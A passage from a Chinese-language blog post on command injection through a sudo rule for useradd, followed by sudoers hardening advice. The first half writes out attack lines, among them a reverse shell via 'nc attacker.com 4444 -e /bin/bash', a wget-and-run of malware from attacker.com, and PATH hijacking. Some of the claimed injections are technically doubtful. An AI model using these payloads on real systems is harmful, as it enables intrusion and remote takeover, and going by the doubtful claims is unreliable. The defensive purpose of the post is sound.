<h3 id="攻击方式与具体注入命令示例"><a href="#攻击方式与具体注入命令示例" class="headerlink" title="攻击方式与具体注入命令示例"></a>攻击方式与具体注入命令示例</h3><p>攻击者会尝试利用 <code>useradd</code> 命令的参数或环境变量来注入分隔符（如 <code>;</code>, <code>&amp;</code>, <code>|</code>, <code>$()</code>, &#96;&#96;&#96;&#96; &#96;&#96;&#96;&#96;&#96;）或换行符 <code>\n</code>，使得 <code>sudo</code> 在执行 <code>/usr/sbin/useradd</code> 时，实际执行了攻击者注入的恶意命令。</p>
<ol>
<li><p><strong>利用 <code>-p</code> &#x2F; <code>--password</code> 参数 (密码哈希)：</strong></p>
<ul>
<li><p><strong>攻击原理：</strong> <code>-p</code> 参数接受的是加密后的密码哈希字符串。如果攻击者能控制这个哈希值，他们可以构造一个包含命令分隔符的“哈希”。</p>
</li>
<li><p><strong>注入示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -p <span class="string">&#x27;$(reboot)&#x27;</span> malicioususer  <span class="comment"># 尝试在密码字段执行reboot</span></span><br><span class="line"><span class="built_in">sudo</span> useradd -p <span class="string">&#x27;; shutdown -h now;&#x27;</span> malicioususer <span class="comment"># 尝试执行关机</span></span><br><span class="line"><span class="built_in">sudo</span> useradd -p <span class="string">&#x27;`id &gt; /tmp/exploit`&#x27;</span> malicioususer <span class="comment"># 尝试执行id命令并输出结果</span></span><br><span class="line"><span class="built_in">sudo</span> useradd -p <span class="string">&#x27;| nc attacker.com 4444 -e /bin/bash |&#x27;</span> malicioususer <span class="comment"># 尝试反弹shell</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>利用 <code>-s</code> &#x2F; <code>--shell</code> 参数 (登录 Shell)：</strong></p>
<ul>
<li><p><strong>攻击原理：</strong> 指定用户登录时使用的 shell。攻击者可以将其设置为一个恶意命令或脚本。</p>
</li>
<li><p><strong>注入示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -s <span class="string">&#x27;/bin/bash -c &quot;id; wget http://attacker.com/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m &amp;&quot;&#x27;</span> malicioususer</span><br><span class="line"><span class="comment"># 创建一个用户，其登录shell实际上会执行一串命令：打印id、下载恶意软件、执行它</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>利用 <code>-c</code> &#x2F; <code>--comment</code> 参数 (GECOS 字段&#x2F;用户备注)：</strong></p>
<ul>
<li><p><strong>攻击原理：</strong> 用户备注信息。虽然 <code>useradd</code> 通常会对这个字段做一定的处理，但在某些实现或特定上下文（如后续脚本处理该字段时）仍可能存在风险。攻击者会尝试注入命令。</p>
</li>
<li><p><strong>注入示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -c <span class="string">&#x27;$(touch /tmp/gecos_exploit)&#x27;</span> malicioususer <span class="comment"># 尝试在注释字段执行命令</span></span><br><span class="line"><span class="built_in">sudo</span> useradd -c <span class="string">&#x27;Bad User; echo &quot;Exploited!&quot; &gt;&gt; /etc/motd&#x27;</span> malicioususer <span class="comment"># 尝试注入命令修改motd</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>利用 <code>-g</code> &#x2F; <code>--gid</code> 或 <code>-G</code> &#x2F; <code>--groups</code> 参数 (主组&#x2F;附加组)：</strong></p>
<ul>
<li><p><strong>攻击原理：</strong> 组名理论上应该是字母数字组合。但如果系统允许非标准组名（或未经验证），攻击者可能尝试注入。</p>
</li>
<li><p><strong>注入示例 (风险较低，但理论上可能)：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -G <span class="string">&#x27;wheel; reboot&#x27;</span> malicioususer <span class="comment"># 尝试在组名后附加命令</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>利用环境变量 (如果 sudo 环境未清理干净)：</strong></p>
<ul>
<li><strong>攻击原理：</strong> <code>useradd</code> 的行为可能受某些环境变量影响（如 <code>PATH</code>, <code>USERADD_*</code> 等特定变量）。如果 <code>sudoers</code> 配置不严格（如未设置 <code>env_reset</code> 或 <code>env_keep</code> 包含危险变量），攻击者可以设置环境变量来影响 <code>useradd</code> 的行为或执行路径中的恶意程序。</li>
<li><strong>攻击步骤：</strong><ol>
<li>攻击者设置一个恶意的 <code>PATH</code>：<code>export PATH=/tmp/evil:$PATH</code></li>
<li>在 <code>/tmp/evil</code> 下放置一个名为 <code>useradd</code> 的恶意脚本。</li>
<li>执行 <code>sudo useradd ...</code>。如果 <code>sudo</code> 没有重置 <code>PATH</code> 到安全路径，它可能会优先执行 <code>/tmp/evil/useradd</code> 这个恶意脚本，而不是 <code>/usr/sbin/useradd</code>。</li>
</ol>
</li>
<li><strong>依赖条件：</strong> <code>sudoers</code> 中该规则或全局配置缺少 <code>env_reset</code> 或 <code>secure_path</code> 设置，或者错误地 <code>env_keep</code> 了 <code>PATH</code>。</li>
</ul>
</li>
<li><p><strong>利用 <code>--extrausers</code> (如果支持且路径可控)：</strong></p>
<ul>
<li><p><strong>攻击原理：</strong> 一些 <code>useradd</code> 实现可能有 <code>--extrausers</code> 选项指向一个外部用户数据库文件。如果攻击者能控制这个路径，可以指向一个恶意文件。</p>
</li>
<li><p><strong>注入示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd --extrausers /tmp/evil_users.conf malicioususer <span class="comment"># 可能加载恶意配置</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="如何防护命令注入攻击"><a href="#如何防护命令注入攻击" class="headerlink" title="如何防护命令注入攻击"></a>如何防护命令注入攻击</h3><p>防护的核心在于 <strong>最小权限原则</strong>、<strong>严格输入验证</strong>、<strong>安全配置</strong> 和 <strong>避免直接执行命令行</strong>：</p>
<ol>
<li><p><strong>避免授予不必要的 sudo 权限 (最佳防御)：</strong></p>
<ul>
<li><strong>根本解决：</strong> 仔细评估是否真的需要让 <code>user5</code> 直接通过 <code>sudo</code> 执行 <code>useradd</code>。大多数场景下，应该有更安全的替代方案（如专门的配置管理工具、API、受限制的Web界面）。</li>
<li><strong>替代方案：</strong> 使用像 <code>adduser</code> 这样的封装脚本（如果它提供更好的参数过滤），或者开发一个<strong>专用的、严格限制参数的小型程序&#x2F;脚本</strong>，只允许执行必要的操作，并通过这个程序来代理 <code>useradd</code> 调用。然后只允许 <code>sudo</code> 执行这个安全的代理程序。</li>
</ul>
</li>
<li><p><strong>在 sudoers 中使用命令参数白名单 (如果必须使用)：</strong></p>
<ul>
<li><p><strong>核心防护：</strong> 这是防护 <code>sudo</code> 命令注入最有效的手段之一。<strong>不要只写命令路径 (<code>/usr/sbin/useradd</code>)，要为命令指定允许的参数。</strong></p>
</li>
<li><p><strong>语法：</strong> <code>user5 ALL=(root) /usr/sbin/useradd [allowed-options]</code></p>
</li>
<li><p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只允许创建用户名为字母数字、指定家目录（固定模式或受限路径）、禁止设置密码、使用固定shell</span></span><br><span class="line">user5 ALL=(root) /usr/sbin/useradd -m -d /home/* -s /bin/bash -- [a-zA-Z0-9]*</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-m -d /home/*</code>：强制创建家目录且路径必须匹配 <code>/home/*</code>。</li>
<li><code>-s /bin/bash</code>：固定使用 <code>/bin/bash</code>，防止注入其他 shell 路径。</li>
<li><code>-- [a-zA-Z0-9]*</code>：<code>--</code> 表示选项结束，后面只能跟匹配 <code>[a-zA-Z0-9]*</code> 正则表达式的用户名（只允许字母数字）。<strong>这是最关键的部分，严格限制了用户名格式。</strong></li>
</ul>
</li>
<li><p><strong>关键点：</strong></p>
<ul>
<li>使用 <code>--</code> 明确分隔选项和用户名。</li>
<li>使用 <strong>正则表达式</strong> 或 <strong>精确匹配</strong> 来严格限定用户名、家目录路径等参数的格式（只允许字母、数字、下划线等安全字符）。<code>sudoers</code> 支持基本的通配符 (<code>?</code>, <code>*</code>) 和字符类 (<code>[a-z]</code>, <code>[0-9]</code>)，更复杂的需求可能需要结合包装脚本。</li>
<li><strong>明确禁止危险选项：</strong> 如 <code>-p</code> (密码)、<code>-c</code> (注释 - 如果不需要复杂注释)、<code>-g</code>&#x2F;<code>-G</code> (如果组名需要严格控制)。在允许列表模式中，不列出的选项就是禁止的。</li>
<li>避免允许用户设置密码 (<code>-p</code>)。初始密码应通过其他安全机制设置。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>强化 sudo 环境：</strong></p>
<ul>
<li><p><strong>设置 <code>env_reset</code>：</strong> 在 <code>sudoers</code> 文件 (<code>Defaults env_reset</code>) 或针对该规则 (<code>Defaults:user5 env_reset</code>) 确保执行命令时环境变量被重置为一个安全的、最小的默认集。</p>
</li>
<li><p><strong>设置 <code>secure_path</code>：</strong> 在 <code>sudoers</code> 中定义 <code>Defaults secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</code> (或类似的安全路径)，确保 <code>sudo</code> 执行命令时只在受控路径下搜索程序，防止 <code>PATH</code> 污染攻击。</p>
</li>
<li><p><strong>清除危险环境变量：</strong> 使用 <code>env_delete</code> 明确删除可能影响目标命令行为的环境变量，特别是 <code>PATH</code>, <code>USERADD_*</code>, <code>SHELL</code> 等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Defaults env_delete += <span class="string">&quot;PATH USERADD_* SHELL ...&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>在调用 sudo 之前进行严格的输入验证 (应用层防护)：</strong></p>
<ul>
<li>如果 <code>user5</code> 的操作是由一个程序（如Web应用、脚本）触发的，<strong>该程序必须对用户提供的所有输入（用户名、组名等）进行严格的验证和过滤。</strong></li>
<li><strong>白名单验证：</strong> 只允许已知安全的字符集合（如字母、数字、下划线、短横线）。<strong>强烈拒绝任何命令分隔符 (<code>; &amp; | $() `` ``\n</code>)、引号、路径分隔符 (<code>/</code>)、特殊字符等。</strong></li>
<li><strong>长度限制：</strong> 对输入参数施加合理的长度限制。</li>
<li><strong>内容检查：</strong> 检查输入是否符合预期的格式（如用户名规则）。</li>
<li><strong>永远不要信任用户输入！</strong></li>
</ul>
</li>
<li><p><strong>使用专门的 API 代替命令行工具：</strong></p>
<ul>
<li><strong>更安全的替代方案：</strong> 如果应用程序需要以编程方式管理用户，<strong>避免使用 <code>system()</code>, <code>exec()</code>, <code>popen()</code> 等执行 shell 命令的函数</strong>。转而使用操作系统提供的专用库或 API。</li>
<li><strong>Linux 示例：</strong> 使用 <code>libuser</code> 库 或直接操作 <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/group</code> 文件（需极其小心权限和数据完整性）或使用 PAM 模块接口。这些 API 通常能避免命令解析和注入的风险。</li>
</ul>
</li>
<li><p><strong>最小化可用选项：</strong></p>
<ul>
<li>在 <code>sudoers</code> 命令白名单中，只允许创建用户所必需的绝对最少的选项。例如：<ul>
<li>固定使用 <code>-m</code> (创建家目录)。</li>
<li>固定使用安全的默认 shell (<code>-s /bin/bash</code> 或 <code>/sbin/nologin</code>)。</li>
<li><strong>绝对禁止 <code>-p</code> (密码)。</strong></li>
<li>限制 <code>-d</code> (家目录) 到特定安全路径模式。</li>
<li>限制 <code>-g</code>&#x2F;<code>-G</code> 到特定的、已知安全的组名（如果必须）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>审计与监控：</strong></p>
<ul>
<li>启用 <code>sudo</code> 日志 (<code>syslog</code>)，并密切监控所有 <code>sudo</code> 命令的执行，特别是 <code>useradd</code> 的使用。关注异常参数或用户名。</li>
<li>定期审计 <code>sudoers</code> 配置和系统用户列表。</li>
</ul>
</li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wickt42</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/07/31/linux提权/">http://example.com/2025/07/31/linux提权/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux/">Linux</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2025/08/01/linux%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"><i class="fa fa-chevron-left">  </i><span>用户权限管理</span></a></div><div class="next-post pull-right"><a href="/2025/07/31/linux%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/"><span>用户管理</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2025 By wickt42</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>